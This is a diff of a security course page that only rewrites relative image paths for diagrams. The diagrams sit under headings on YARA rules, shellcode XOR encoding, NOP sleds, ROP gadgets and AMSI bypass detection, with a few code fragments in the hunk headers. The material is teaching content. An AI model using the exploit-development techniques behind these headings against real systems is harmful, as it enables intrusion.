+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/creating-yara-rules-for-malware-detection-diagram.svg" alt="Diagram: Creating YARA Rules for Malware Detection" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/creating-yara-rules-for-malware-detection-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/creating-yara-rules-for-malware-detection-sticky.svg" alt="Sticky Note: Creating YARA Rules for Malware Detection" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/creating-yara-rules-for-malware-detection-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/creating-yara-rules-for-malware-detection-sticky.svg" alt="Sticky Note: Creating YARA Rules for Malware Detection" width="30%">
 </a>
 
 
@@ -4149,14 +4149,14 @@ rule Generic_Shellcode {
 
 ### Running YARA Scan
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/running-yara-scan-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/running-yara-scan-handwritten.svg" alt="Handwritten: Running YARA Scan" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/running-yara-scan-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/running-yara-scan-handwritten.svg" alt="Handwritten: Running YARA Scan" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/running-yara-scan-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/running-yara-scan-diagram.svg" alt="Diagram: Running YARA Scan" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/running-yara-scan-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/running-yara-scan-diagram.svg" alt="Diagram: Running YARA Scan" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/running-yara-scan-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/running-yara-scan-sticky.svg" alt="Sticky Note: Running YARA Scan" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/running-yara-scan-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/running-yara-scan-sticky.svg" alt="Sticky Note: Running YARA Scan" width="30%">
 </a>
 
 
@@ -4179,14 +4179,14 @@ SUNBURST_Backdoor C:\samples\SolarWinds.Orion.Core.BusinessLayer.dll
 
 ### Complete PE Analysis Workflow
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/complete-pe-analysis-workflow-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/complete-pe-analysis-workflow-handwritten.svg" alt="Handwritten: Complete PE Analysis Workflow" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/complete-pe-analysis-workflow-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/complete-pe-analysis-workflow-handwritten.svg" alt="Handwritten: Complete PE Analysis Workflow" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/complete-pe-analysis-workflow-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/complete-pe-analysis-workflow-diagram.svg" alt="Diagram: Complete PE Analysis Workflow" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/complete-pe-analysis-workflow-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/complete-pe-analysis-workflow-diagram.svg" alt="Diagram: Complete PE Analysis Workflow" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/complete-pe-analysis-workflow-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/complete-pe-analysis-workflow-sticky.svg" alt="Sticky Note: Complete PE Analysis Workflow" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/complete-pe-analysis-workflow-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/complete-pe-analysis-workflow-sticky.svg" alt="Sticky Note: Complete PE Analysis Workflow" width="30%">
 </a>
 
 
@@ -4263,14 +4263,14 @@ Check these PEStudio indicators:
 
 ### Buffer Overflow Edge Cases
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/buffer-overflow-edge-cases-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/buffer-overflow-edge-cases-handwritten.svg" alt="Handwritten: Buffer Overflow Edge Cases" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/buffer-overflow-edge-cases-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/buffer-overflow-edge-cases-handwritten.svg" alt="Handwritten: Buffer Overflow Edge Cases" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/buffer-overflow-edge-cases-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/buffer-overflow-edge-cases-diagram.svg" alt="Diagram: Buffer Overflow Edge Cases" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/buffer-overflow-edge-cases-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/buffer-overflow-edge-cases-diagram.svg" alt="Diagram: Buffer Overflow Edge Cases" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/buffer-overflow-edge-cases-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/buffer-overflow-edge-cases-sticky.svg" alt="Sticky Note: Buffer Overflow Edge Cases" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/buffer-overflow-edge-cases-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/buffer-overflow-edge-cases-sticky.svg" alt="Sticky Note: Buffer Overflow Edge Cases" width="30%">
 </a>
 
 
@@ -4287,14 +4287,14 @@ Check these PEStudio indicators:
 
 ### Malware Edge Cases
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/malware-edge-cases-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/malware-edge-cases-handwritten.svg" alt="Handwritten: Malware Edge Cases" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/malware-edge-cases-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/malware-edge-cases-handwritten.svg" alt="Handwritten: Malware Edge Cases" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/malware-edge-cases-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/malware-edge-cases-diagram.svg" alt="Diagram: Malware Edge Cases" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/malware-edge-cases-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/malware-edge-cases-diagram.svg" alt="Diagram: Malware Edge Cases" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/malware-edge-cases-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/malware-edge-cases-sticky.svg" alt="Sticky Note: Malware Edge Cases" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/malware-edge-cases-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/malware-edge-cases-sticky.svg" alt="Sticky Note: Malware Edge Cases" width="30%">
 </a>
 
 
@@ -4315,14 +4315,14 @@ Check these PEStudio indicators:
 
 ### NOP Sled Variations
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/nop-sled-variations-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/nop-sled-variations-handwritten.svg" alt="Handwritten: NOP Sled Variations" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/nop-sled-variations-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/nop-sled-variations-handwritten.svg" alt="Handwritten: NOP Sled Variations" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/nop-sled-variations-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/nop-sled-variations-diagram.svg" alt="Diagram: NOP Sled Variations" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/nop-sled-variations-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/nop-sled-variations-diagram.svg" alt="Diagram: NOP Sled Variations" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/nop-sled-variations-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/nop-sled-variations-sticky.svg" alt="Sticky Note: NOP Sled Variations" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/nop-sled-variations-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/nop-sled-variations-sticky.svg" alt="Sticky Note: NOP Sled Variations" width="30%">
 </a>
 
 
@@ -4350,14 +4350,14 @@ dec ecx           ; 0x49 → reverses inc
 
 ### Shellcode Encoding with Custom XOR
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/shellcode-encoding-with-custom-xor-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/shellcode-encoding-with-custom-xor-handwritten.svg" alt="Handwritten: Shellcode Encoding with Custom XOR" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/shellcode-encoding-with-custom-xor-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/shellcode-encoding-with-custom-xor-handwritten.svg" alt="Handwritten: Shellcode Encoding with Custom XOR" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/shellcode-encoding-with-custom-xor-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/shellcode-encoding-with-custom-xor-diagram.svg" alt="Diagram: Shellcode Encoding with Custom XOR" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/shellcode-encoding-with-custom-xor-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/shellcode-encoding-with-custom-xor-diagram.svg" alt="Diagram: Shellcode Encoding with Custom XOR" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/shellcode-encoding-with-custom-xor-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/shellcode-encoding-with-custom-xor-sticky.svg" alt="Sticky Note: Shellcode Encoding with Custom XOR" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/shellcode-encoding-with-custom-xor-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/shellcode-encoding-with-custom-xor-sticky.svg" alt="Sticky Note: Shellcode Encoding with Custom XOR" width="30%">
 </a>
 
 
@@ -4434,14 +4434,14 @@ int main() {
 
 ### Essential Gadgets for ROP Chains
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/essential-gadgets-for-rop-chains-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/essential-gadgets-for-rop-chains-handwritten.svg" alt="Handwritten: Essential Gadgets for ROP Chains" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/essential-gadgets-for-rop-chains-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/essential-gadgets-for-rop-chains-handwritten.svg" alt="Handwritten: Essential Gadgets for ROP Chains" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/essential-gadgets-for-rop-chains-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/essential-gadgets-for-rop-chains-diagram.svg" alt="Diagram: Essential Gadgets for ROP Chains" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/essential-gadgets-for-rop-chains-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/essential-gadgets-for-rop-chains-diagram.svg" alt="Diagram: Essential Gadgets for ROP Chains" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/essential-gadgets-for-rop-chains-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/essential-gadgets-for-rop-chains-sticky.svg" alt="Sticky Note: Essential Gadgets for ROP Chains" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/essential-gadgets-for-rop-chains-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/essential-gadgets-for-rop-chains-sticky.svg" alt="Sticky Note: Essential Gadgets for ROP Chains" width="30%">
 </a>
 
 
@@ -4482,14 +4482,14 @@ push rax; ret             ; Jump to rax (alternative to jmp rax)
 
 ### Finding Specific Gadgets with ropper
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/finding-specific-gadgets-with-ropper-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/finding-specific-gadgets-with-ropper-handwritten.svg" alt="Handwritten: Finding Specific Gadgets with ropper" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/finding-specific-gadgets-with-ropper-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/finding-specific-gadgets-with-ropper-handwritten.svg" alt="Handwritten: Finding Specific Gadgets with ropper" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/finding-specific-gadgets-with-ropper-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/finding-specific-gadgets-with-ropper-diagram.svg" alt="Diagram: Finding Specific Gadgets with ropper" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/finding-specific-gadgets-with-ropper-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/finding-specific-gadgets-with-ropper-diagram.svg" alt="Diagram: Finding Specific Gadgets with ropper" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/finding-specific-gadgets-with-ropper-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/finding-specific-gadgets-with-ropper-sticky.svg" alt="Sticky Note: Finding Specific Gadgets with ropper" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/finding-specific-gadgets-with-ropper-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/finding-specific-gadgets-with-ropper-sticky.svg" alt="Sticky Note: Finding Specific Gadgets with ropper" width="30%">
 </a>
 
 
@@ -4513,14 +4513,14 @@ ropper --file vuln --all > all_gadgets.txt
 
 ### Stack Alignment (movaps) Workaround
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/stack-alignment-movaps-workaround-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/stack-alignment-movaps-workaround-handwritten.svg" alt="Handwritten: Stack Alignment (movaps) Workaround" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/stack-alignment-movaps-workaround-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/stack-alignment-movaps-workaround-handwritten.svg" alt="Handwritten: Stack Alignment (movaps) Workaround" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/stack-alignment-movaps-workaround-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/stack-alignment-movaps-workaround-diagram.svg" alt="Diagram: Stack Alignment (movaps) Workaround" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/stack-alignment-movaps-workaround-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/stack-alignment-movaps-workaround-diagram.svg" alt="Diagram: Stack Alignment (movaps) Workaround" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/stack-alignment-movaps-workaround-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/stack-alignment-movaps-workaround-sticky.svg" alt="Sticky Note: Stack Alignment (movaps) Workaround" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/stack-alignment-movaps-workaround-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/stack-alignment-movaps-workaround-sticky.svg" alt="Sticky Note: Stack Alignment (movaps) Workaround" width="30%">
 </a>
 
 
@@ -4563,14 +4563,14 @@ chain_alt = [
 
 ### Detecting Reflective DLL Injection
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/detecting-reflective-dll-injection-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/detecting-reflective-dll-injection-handwritten.svg" alt="Handwritten: Detecting Reflective DLL Injection" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/detecting-reflective-dll-injection-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/detecting-reflective-dll-injection-handwritten.svg" alt="Handwritten: Detecting Reflective DLL Injection" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/detecting-reflective-dll-injection-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/detecting-reflective-dll-injection-diagram.svg" alt="Diagram: Detecting Reflective DLL Injection" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/detecting-reflective-dll-injection-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/detecting-reflective-dll-injection-diagram.svg" alt="Diagram: Detecting Reflective DLL Injection" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/detecting-reflective-dll-injection-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/detecting-reflective-dll-injection-sticky.svg" alt="Sticky Note: Detecting Reflective DLL Injection" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/detecting-reflective-dll-injection-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/detecting-reflective-dll-injection-sticky.svg" alt="Sticky Note: Detecting Reflective DLL Injection" width="30%">
 </a>
 
 
@@ -4603,14 +4603,14 @@ foreach ($proc in $processes) {
 
 ### AMSI Bypass Detection
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/amsi-bypass-detection-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/amsi-bypass-detection-handwritten.svg" alt="Handwritten: AMSI Bypass Detection" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/amsi-bypass-detection-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/amsi-bypass-detection-handwritten.svg" alt="Handwritten: AMSI Bypass Detection" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/amsi-bypass-detection-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/amsi-bypass-detection-diagram.svg" alt="Diagram: AMSI Bypass Detection" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/amsi-bypass-detection-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/amsi-bypass-detection-diagram.svg" alt="Diagram: AMSI Bypass Detection" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/amsi-bypass-detection-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/amsi-bypass-detection-sticky.svg" alt="Sticky Note: AMSI Bypass Detection" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/amsi-bypass-detection-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/amsi-bypass-detection-sticky.svg" alt="Sticky Note: AMSI Bypass Detection" width="30%">
 </a>
 
 
@@ -4670,14 +4670,14 @@ Get-WinEvent -FilterHashtable @{
 
 ### Linux ASLR Entropy by Architecture and Kernel Version
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/linux-aslr-entropy-by-architecture-and-kernel-version-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/linux-aslr-entropy-by-architecture-and-kernel-version-handwritten.svg" alt="Handwritten: Linux ASLR Entropy by Architecture and Kernel Version" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/linux-aslr-entropy-by-architecture-and-kernel-version-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/linux-aslr-entropy-by-architecture-and-kernel-version-handwritten.svg" alt="Handwritten: Linux ASLR Entropy by Architecture and Kernel Version" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/linux-aslr-entropy-by-architecture-and-kernel-version-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/linux-aslr-entropy-by-architecture-and-kernel-version-diagram.svg" alt="Diagram: Linux ASLR Entropy by Architecture and Kernel Version" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/linux-aslr-entropy-by-architecture-and-kernel-version-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/linux-aslr-entropy-by-architecture-and-kernel-version-diagram.svg" alt="Diagram: Linux ASLR Entropy by Architecture and Kernel Version" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/linux-aslr-entropy-by-architecture-and-kernel-version-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/linux-aslr-entropy-by-architecture-and-kernel-version-sticky.svg" alt="Sticky Note: Linux ASLR Entropy by Architecture and Kernel Version" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/linux-aslr-entropy-by-architecture-and-kernel-version-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/linux-aslr-entropy-by-architecture-and-kernel-version-sticky.svg" alt="Sticky Note: Linux ASLR Entropy by Architecture and Kernel Version" width="30%">
 </a>
 
 
@@ -4709,14 +4709,14 @@ cat /proc/self/maps
 
 ### ASLR Effectiveness on Different Platforms
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/aslr-effectiveness-on-different-platforms-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/aslr-effectiveness-on-different-platforms-handwritten.svg" alt="Handwritten: ASLR Effectiveness on Different Platforms" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/aslr-effectiveness-on-different-platforms-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/aslr-effectiveness-on-different-platforms-handwritten.svg" alt="Handwritten: ASLR Effectiveness on Different Platforms" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/aslr-effectiveness-on-different-platforms-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/aslr-effectiveness-on-different-platforms-diagram.svg" alt="Diagram: ASLR Effectiveness on Different Platforms" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/aslr-effectiveness-on-different-platforms-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/aslr-effectiveness-on-different-platforms-diagram.svg" alt="Diagram: ASLR Effectiveness on Different Platforms" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/aslr-effectiveness-on-different-platforms-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/aslr-effectiveness-on-different-platforms-sticky.svg" alt="Sticky Note: ASLR Effectiveness on Different Platforms" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/aslr-effectiveness-on-different-platforms-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/aslr-effectiveness-on-different-platforms-sticky.svg" alt="Sticky Note: ASLR Effectiveness on Different Platforms" width="30%">
 </a>
 
 
@@ -4736,14 +4736,14 @@ cat /proc/self/maps
 
 ### Pre-Coding Decisions
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/pre-coding-decisions-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/pre-coding-decisions-handwritten.svg" alt="Handwritten: Pre-Coding Decisions" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/pre-coding-decisions-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/pre-coding-decisions-handwritten.svg" alt="Handwritten: Pre-Coding Decisions" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/pre-coding-decisions-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/pre-coding-decisions-diagram.svg" alt="Diagram: Pre-Coding Decisions" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/pre-coding-decisions-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/pre-coding-decisions-diagram.svg" alt="Diagram: Pre-Coding Decisions" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/pre-coding-decisions-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/pre-coding-decisions-sticky.svg" alt="Sticky Note: Pre-Coding Decisions" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/pre-coding-decisions-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/pre-coding-decisions-sticky.svg" alt="Sticky Note: Pre-Coding Decisions" width="30%">
 </a>
 
 
@@ -4756,14 +4756,14 @@ cat /proc/self/maps
 
 ### During Implementation
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/during-implementation-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/during-implementation-handwritten.svg" alt="Handwritten: During Implementation" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/during-implementation-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/during-implementation-handwritten.svg" alt="Handwritten: During Implementation" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/during-implementation-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/during-implementation-diagram.svg" alt="Diagram: During Implementation" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/during-implementation-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/during-implementation-diagram.svg" alt="Diagram: During Implementation" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/during-implementation-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/during-implementation-sticky.svg" alt="Sticky Note: During Implementation" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/during-implementation-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/during-implementation-sticky.svg" alt="Sticky Note: During Implementation" width="30%">
 </a>
 
 
@@ -4783,14 +4783,14 @@ cat /proc/self/maps
 
 ### Code Review Checklist
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/code-review-checklist-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/code-review-checklist-handwritten.svg" alt="Handwritten: Code Review Checklist" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/code-review-checklist-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/code-review-checklist-handwritten.svg" alt="Handwritten: Code Review Checklist" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/code-review-checklist-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/code-review-checklist-diagram.svg" alt="Diagram: Code Review Checklist" width="30%">
